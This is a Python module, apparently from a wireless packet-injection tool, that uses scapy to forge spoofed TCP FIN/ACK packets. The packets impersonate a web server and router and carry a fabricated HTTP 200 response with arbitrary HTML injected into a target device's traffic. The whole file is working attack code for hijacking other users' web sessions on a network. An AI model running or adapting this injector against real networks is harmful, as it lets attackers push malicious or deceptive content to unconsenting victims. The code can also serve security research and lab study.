import scapy.arch
import time
from .visuals import Bcolors
from scapy.config import conf
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.packet import Padding, Raw
from scapy.sendrecv import __gen_send as gs

class Injector(object):
    """Uses scapy to inject packets on the networks"""
    __slots__ = ('interface',
                 'args',
                 'injSocket',
                 'injMac')

    def __init__(self, args):
        self.interface = args.i
        self.args = args
        self.injSocket = conf.L2socket(iface = self.interface)
        if (args.m != args.i) or args.tun is True:
            self.injMac = scapy.arch.get_if_hwaddr(self.interface)


    def hdrGen(self, injection):
        """ Create the HTML headers """
        return '\r\n'.join(['HTTP/1.1 200 OK',
                            'Date: {}'.format(time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())),
                            'Server: Apache',
                            'Content-Length: {}'.format(len(injection)),
                            'Connection: close',
                            'Content-Type: text/html\r\n\r\n'])


    def inject(self,
               tgtmac,
               rtrmac,
               dstmac,
               tgtip,
               svrip,
               tgtport,
               svrport,
               acknum,
               seqnum,
               injection,
               TSVal,
               TSecr):
        """Send the injection using Scapy

        This method is where the actual packet is created for sending things
        such as the payload and associated flags.

        FIN/ACK flag is sent to the target with this method.
        """
        if self.args.tun is False:

            ## Monitor injection
            if self.args.inj == 'mon':
                packet = RadioTap()\
                         /Dot11(
                                FCfield = 'from-DS',
                                addr1 = tgtmac,
                                addr2 = rtrmac,
                                addr3 = dstmac
                               )\
                         /LLC()\
                         /SNAP()\
                         /IP(
                             dst = tgtip,
                             src = svrip
                            )\
                         /TCP(
                              flags = 'FA',
                              sport = int(svrport),
                              dport = int(tgtport),
                              seq = int(seqnum),
                              ack = int(acknum)
                             )\
                         /Raw(
                              load = self.hdrGen(injection) + injection
                             )

                if TSVal is not None and TSecr is not None:
                    packet[TCP].options = [
                                           ('NOP', None),
                                           ('NOP', None),
                                           ('Timestamp', ((round(time.time()), TSVal)))
                                          ]
                else:
                    packet[TCP].options = [
                                           ('NOP', None),
                                           ('NOP', None),
                                           ('Timestamp', ((round(time.time()), 0)))
                                          ]
            ## Managed injection
            else:
                packet = Ether(
                               src = self.injMac,\
                               dst = tgtmac\
                              )\
                         /IP(
                             dst = tgtip,
                             src = svrip
                             )\
                         /TCP(
                              flags = 'FA',
                              sport = int(svrport),
                              dport = int(tgtport),
                              seq = int(seqnum),
                              ack = int(acknum)
                             )\
                         /Raw(
                              load = self.hdrGen(injection) + injection
                             )

                if TSVal is not None:
                    packet[TCP].options = [\
                                          ('NOP', None),\
                                          ('NOP', None),\
                                          ('Timestamp', ((round(time.time()), TSVal)))\
                                          ]
                else:
                    packet[TCP].options = [\
                                          ('NOP', None),\
                                          ('NOP', None),\
                                          ('Timestamp', ((round(time.time()), 0)))\
                                          ]

        ## Managed
        else:
            try:
                packet = Ether(
                               src = self.injMac,\
                               dst = tgtmac\
                              )\
                         /IP(
                             dst = tgtip,
                             src = svrip
                            )\
                         /TCP(
                              flags = 'FA',
                              sport = int(svrport),
                              dport = int(tgtport),
                              seq = int(seqnum),
                              ack = int(acknum)
                             )\
                         /Raw(
                              load = self.hdrGen(injection) + injection
                             )

                if TSVal is not None:
                    packet[TCP].options = [
                                           ('NOP', None),\
                                           ('NOP', None),\
                                           ('Timestamp', ((round(time.time()), TSVal)))\
                                          ]
                else:
                    packet[TCP].options = [
                                           ('NOP', None),\
                                           ('NOP', None),\
                                           ('Timestamp', ((round(time.time()), 0)))\
                                          ]
            except Exception as E:
                print(E)

        ## Inject
        try:
            gs(self.injSocket, packet, verbose = False)
            print('[*] Packet injected to {0}'.format(tgtmac))
        except Exception as E:
            print(E)
